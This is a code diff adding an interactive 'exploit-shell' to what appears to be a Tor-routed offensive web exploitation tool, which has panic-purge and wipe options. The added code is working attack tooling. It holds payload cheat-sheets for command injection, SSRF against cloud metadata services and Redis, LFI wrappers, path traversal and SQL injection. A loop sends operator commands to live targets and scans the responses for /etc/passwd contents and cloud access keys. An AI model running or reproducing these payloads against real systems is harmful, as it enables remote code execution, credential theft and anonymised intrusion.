@@ -3889,6 +3889,7 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
               f"{G}V{N}  Save captures to file")
         print(f"  {G}G{N}  Generate report        "
               f"{G}S{N}  Stop attacker server")
+        print(f"  {G}E{N}  Exploit-shell (drive an RCE/cmdi/SSRF/LFI finding)")
         print(f"  {R}Z{N}  NEW IDENTITY (panic purge)  "
               f"{G}Q{N}  Quit + wipe everything")
         print()
@@ -4029,6 +4030,12 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
         elif cmd == "C":
             _control_deck_custom_request(executor, attacker_url,
                                           callback_urls, chain_data)
+
+        elif cmd == "E":
+            _control_deck_exploit_shell(
+                exploitable, executor, file_mgr, server, audit,
+                chain_data, attacker_url, callback_urls,
+                infra_is_loopback)
 
         elif cmd == "A":
             print()
@@ -4200,7 +4207,7 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
 
         else:
             warn(f"Unknown command: {cmd!r}")
-            info("Valid commands: R P L C A F U M N H T I X V G S Z Q "
+            info("Valid commands: R P L C A F U M N H T I X V G S E Z Q "
                  "(single letter, case-insensitive).")
 
 
@@ -4485,6 +4492,342 @@ def _control_deck_custom_request(executor, attacker_url,
     print()
     info("Response stashed into chain_data: "
          "[LAST_CUSTOM_STATUS] [LAST_CUSTOM_BODY] [LAST_CUSTOM_URL]")
+
+
+# ── Exploit-shell ─────────────────────────────────────────────────────────
+# Findings that result in command execution (command_injection, ssrf
+# against internal services that accept commands, LFI + log-poison, etc.)
+# deserve more than a scripted list of pre-built steps — the operator
+# knows what THEY want to ask the target, and they need a low-friction
+# way to do it. _control_deck_exploit_shell drives that: pick a compat-
+# ible finding from the list, type a command (or choose from a cheat-
+# sheet of common ones), payload is wrapped in the finding's
+# injection shape and sent through the TorClient, output is parsed
+# and displayed. State between calls is preserved so follow-up
+# commands can build on previous output.
+
+# Vuln types that can drive an interactive shell-style loop.
+_EXPLOIT_SHELL_TYPES = frozenset((
+    "command_injection", "cmdi", "rce",
+    "ssrf",
+    "lfi", "path_traversal",
+    "sqli",  # read-only via differential/error payloads
+))
+
+
+# Cheat-sheet of commonly-useful payloads keyed by vuln type. Each
+# value is a list of (label, payload_template) tuples. {cmd} is
+# substituted with the operator's typed command; other placeholders
+# stay literal. The first entry is the default.
+_EXPLOIT_SHELL_CHEATS: Dict[str, List[Tuple[str, str]]] = {
+    "command_injection": [
+        ("unix:;$cmd",     ";{cmd}"),
+        ("unix:|$cmd",     "|{cmd}"),
+        ("unix:`$cmd`",    "`{cmd}`"),
+        ("unix:$(...)",    "$({cmd})"),
+        ("unix:&&",        "&&{cmd}"),
+        ("unix:newline",   "\n{cmd}\n"),
+        ("win:&$cmd",      "&{cmd}"),
+        ("win:|$cmd",      "|{cmd}"),
+    ],
+    "ssrf": [
+        ("aws imdsv2",
+         "http://169.254.169.254/latest/meta-data/{cmd}"),
+        ("aws imdsv1",
+         "http://169.254.169.254/latest/meta-data/{cmd}"),
+        ("gcp metadata",
+         "http://metadata.google.internal/computeMetadata/v1/"
+         "instance/{cmd}"),
+        ("azure imds",
+         "http://169.254.169.254/metadata/"
+         "instance?api-version=2021-02-01&{cmd}"),
+        ("localhost http",
+         "http://127.0.0.1/{cmd}"),
+        ("redis",
+         "http://127.0.0.1:6379/{cmd}"),
+        ("file read",
+         "file:///{cmd}"),
+    ],
+    "lfi": [
+        ("unix path",      "../../../{cmd}"),
+        ("null-byte",      "../../../{cmd}%00"),
+        ("wrapper:file",   "file:///{cmd}"),
+        ("wrapper:php",    "php://filter/convert.base64-encode/resource={cmd}"),
+        ("wrapper:expect", "expect://{cmd}"),
+        ("wrapper:data",   "data://text/plain,{cmd}"),
+    ],
+    "path_traversal": [
+        ("unix path",      "../../../{cmd}"),
+        ("null-byte",      "../../../{cmd}%00"),
+        ("encoded",        "..%2f..%2f..%2f{cmd}"),
+    ],
+    "sqli": [
+        ("union-1col",     "' UNION SELECT {cmd}-- -"),
+        ("union-2col",     "' UNION SELECT NULL,{cmd}-- -"),
+        ("errorbased",     "' AND (SELECT 1 FROM ({cmd})a)-- -"),
+        ("blind-time-mysql", "' AND SLEEP({cmd})-- -"),
+        ("blind-time-pg",  "'; SELECT pg_sleep({cmd})-- -"),
+        ("blind-bool",     "' AND ({cmd})-- -"),
+    ],
+}
+
+
+def _control_deck_exploit_shell(exploitable, executor, file_mgr,
+                                  server, audit, chain_data,
+                                  attacker_url, callback_urls,
+                                  infra_is_loopback):
+    """Drive a confirmed-exploitable finding interactively.
+
+    Flow:
+      1. List exploitable findings whose type supports shell-like
+         interaction. If none, say so + return.
+      2. Operator picks one by number.
+      3. Show the cheat-sheet of payload templates for that vuln
+         type — operator picks a template (default = #1).
+      4. Operator types a command / path / SSRF subpath / SQLi
+         expression. Each enter sends ONE request.
+      5. Response body is parsed (uid=/etc/passwd/etc.) and the
+         first 4 KiB shown.
+      6. Every successful output is appended to a local transcript
+         and stashed into chain_data so subsequent steps or re-runs
+         can reference it.
+      7. `t` = switch template, `f` = switch finding, `q` = back to
+         deck.
+    """
+    # Filter exploitable findings by supported type.
+    candidates = []
+    for idx, v in enumerate(exploitable or []):
+        ei = v.get("exploit_info") or {}
+        etype = (ei.get("type") or v.get("type") or "").lower()
+        # Also honor aliases.
+        if etype in _EXPLOIT_SHELL_TYPES or etype in (
+                "command_injection", "cmdi", "rce"):
+            candidates.append((idx, v))
+    if not candidates:
+        print()
+        warn("No exploit-shell-compatible findings "
+             "(command_injection / ssrf / lfi / path_traversal / sqli) "
+             "in the current scan.")
+        info("If you have one but the type doesn't match, the scanner's "
+             "exploit_info.type field decides eligibility.")
+        return
+    if executor is None or getattr(executor, "_client", None) is None:
+        warn("No step executor / TorClient available.")
+        return
+
+    print()
+    heading("Exploit-Shell")
+    print(f"  {B}Eligible findings:{N}")
+    for disp_i, (orig_idx, v) in enumerate(candidates, 1):
+        ei = v.get("exploit_info") or {}
+        sev = v.get("severity", "?")
+        etype = ei.get("type", "?")
+        title = _tsafe_preview(v.get("title", "?"), 60)
+        param = ei.get("parameter") or ei.get("param") or "-"
+        meth = ei.get("method", "GET")
+        color = {"CRITICAL": R, "HIGH": R,
+                 "MEDIUM": Y, "LOW": C}.get(sev, D)
+        print(f"    {disp_i:>2}. {color}[{sev:6}]{N} {etype:18} "
+              f"{meth:4} param={_tsafe_preview(str(param), 20):20} "
+              f"{title}")
+    print()
+    pick = prompt("Finding # (blank to cancel)", "").strip()
+    if not pick or not pick.isdigit():
+        info("Cancelled.")
+        return
+    pick_i = int(pick)
+    if not (1 <= pick_i <= len(candidates)):
+        err(f"Out of range 1..{len(candidates)}")
+        return
+    _orig_idx, finding = candidates[pick_i - 1]
+    ei = finding.get("exploit_info") or {}
+    etype = (ei.get("type") or "").lower()
+    method = (ei.get("method") or "GET").upper()
+    param = ei.get("parameter") or ei.get("param") or ""
+    test_url = finding.get("test_url") or ei.get("url") \
+        or finding.get("url") or ""
+
+    # Normalize type to the cheat-sheet key (cmdi aliases to
+    # command_injection).
+    cheat_key = etype
+    if etype in ("cmdi", "rce"):
+        cheat_key = "command_injection"
+    cheats = _EXPLOIT_SHELL_CHEATS.get(cheat_key, [])
+    if not cheats:
+        warn(f"No cheat-sheet for type {etype!r} — using raw substitution.")
+        cheats = [("raw", "{cmd}")]
+    # default template
+    tpl_label, tpl = cheats[0]
+
+    print()
+    ok(f"Targeting {etype} finding at "
+       f"{_tsafe_preview(test_url, 80)} (param={param})")
+    info(f"Method: {method}")
+    info(f"Template: {tpl_label} → {_tsafe_preview(tpl, 80)}")
+    print()
+    print(f"  Shortcuts:  {G}t{N}=template  {G}f{N}=finding  "
+          f"{G}l{N}=list-templates  {G}q{N}=back to deck")
+    print(f"  Anything else = payload body ({{cmd}} is substituted).")
+    print()
+
+    transcript: List[Tuple[str, str]] = []
+
+    def _list_templates():
+        print(f"  {B}Templates for {cheat_key}:{N}")
+        for i, (lbl, p) in enumerate(cheats, 1):
+            marker = "*" if (lbl == tpl_label) else " "
+            print(f"    {marker} {i:>2}. {lbl:20} → "
+                  f"{_tsafe_preview(p, 80)}")
+        print()
+
+    while True:
+        try:
+            cmd_line = prompt(
+                f"exploit[{cheat_key}:{tpl_label}]$", "")
+        except KeyboardInterrupt:
+            print()
+            info("(Ctrl+C — leaving exploit-shell.)")
+            try:
+                _shutdown_event.clear()
+            except Exception:
+                pass
+            break
+        cmd_line = cmd_line.strip()
+        if not cmd_line:
+            continue
+        if cmd_line.lower() in ("q", "quit", "exit", "deck"):
+            break
+        if cmd_line.lower() == "l":
+            _list_templates()
+            continue
+        if cmd_line.lower() == "t":
+            _list_templates()
+            nxt = prompt("Template # (blank cancel)", "").strip()
+            if nxt.isdigit():
+                ni = int(nxt)
+                if 1 <= ni <= len(cheats):
+                    tpl_label, tpl = cheats[ni - 1]
+                    ok(f"Template → {tpl_label}")
+                else:
+                    err("out of range")
+            continue
+        if cmd_line.lower() == "f":
+            # Re-pick finding — recurse.
+            return _control_deck_exploit_shell(
+                exploitable, executor, file_mgr, server, audit,
+                chain_data, attacker_url, callback_urls,
+                infra_is_loopback)
+
+        # Build the injection payload by substituting {cmd} into
+        # the current template.
+        try:
+            payload = tpl.format(cmd=cmd_line)
+        except Exception as _fmt_err:
+            err(f"template format failed: {type(_fmt_err).__name__}")
+            continue
+
+        # Build the outbound request.
+        req_url = test_url
+        req_params = None
+        req_data = None
+        if method == "POST":
+            # Inject in POST body under the param name.
+            req_data = {param: payload} if param else {"payload": payload}
+        else:
+            # GET/HEAD — inject as query param.
+            req_params = {param: payload} if param else {"q": payload}
+
+        # Apply placeholder expansion for [ATTACKER] / callback URLs
+        # in case the cheat template includes any (the SSRF ones do).
+        def _expand_v(s):
+            if isinstance(s, str):
+                return _subst_attacker(s, attacker_url,
+                                        callback_urls=callback_urls)
+            return s
+        if req_params:
+            req_params = {k: _expand_v(v) for k, v in req_params.items()}
+        if req_data:
+            req_data = {k: _expand_v(v) for k, v in req_data.items()}
+
+        print(f"  → [{method}] {_tsafe_preview(req_url, 80)}")
+        if req_params:
+            info(f"    params: {req_params}")
+        if req_data:
+            info(f"    data:   {req_data}")
+
+        client = executor._client
+        try:
+            result = client.request(
+                method=method, url=req_url,
+                params=req_params, data=req_data,
+                allow_redirects=True,
+            )
+        except Exception as _e:
+            err(f"request failed: {type(_e).__name__}: "
+                f"{_tsafe_preview(str(_e), 100)}")
+            audit.log("exploit_shell_error",
+                      f"{etype}:{type(_e).__name__}",
+                      risk=AuditTrail.RISK_HIGH)
+            continue
+
+        status = getattr(result, "status_code", 0) or 0
+        body = getattr(result, "response_body", "") or ""
+        color = G if 200 <= status < 400 else Y if status else R
+        print(f"  {color}HTTP {status}{N}  "
+              f"({len(body)} B, {result.elapsed:.2f}s)")
+
+        # Parse a few high-signal patterns so we can tell at a
+        # glance whether the payload executed.
+        signals = []
+        for pat, label in [
+            (r"uid=\d+\([^)]*\)", "uid"),
+            (r"root:x:0:0:", "/etc/passwd"),
+            (r"Linux\s+\S+\s+[\d.]+", "uname"),
+            (r"Microsoft Windows", "Windows"),
+            (r"ami-id|instance-id|AccessKeyId", "cloud-metadata"),
+            (r"redis_version|role:master", "redis"),
+            (r"1111111111", "ssti-49-marker"),  # raw SSTI success
+        ]:
+            m = re.search(pat, body)
+            if m:
+                signals.append(f"{label}: "
+                               f"{_tsafe_preview(m.group(0), 60)}")
+        if signals:
+            for s in signals:
+                ok(s)
+        else:
+            info("no canonical command-output patterns matched.")
+
+        if body:
+            shown = _tsafe(body[:4096])
+            print(f"  {B}Response body (first 4 KiB):{N}")
+            for line in shown.split("\n")[:40]:
+                print(f"    {line[:300]}")
+            if len(body) > 4096:
+                print(f"    {D}... ({len(body)-4096} more bytes){N}")
+
+        # Stash into chain_data + transcript for downstream re-use.
+        transcript.append((cmd_line, body[:2048]))
+        chain_data["last_output"] = body[:10000]
+        chain_data["last_status"] = str(status)
+        chain_data[f"{etype}_last_cmd"] = cmd_line
+        chain_data[f"{etype}_last_body"] = body[:10000]
+
+        audit.log("exploit_shell_cmd",
+                  f"{etype} param={param} "
+                  f"cmd={_tsafe_preview(cmd_line, 40)} "
+                  f"-> {status}",
+                  risk=AuditTrail.RISK_HIGH,
+                  success=bool(signals))
+        print()
+
+    # Exit summary
+    if transcript:
+        ok(f"Exploit-shell session: {len(transcript)} command(s) sent.")
+        info("  chain_data keys: last_output, last_status, "
+             f"{etype}_last_cmd, {etype}_last_body")
+    else:
+        info("Exploit-shell session ended with no commands sent.")
 
 
 def _generate_and_show_report(audit, file_mgr, findings_summary, server):
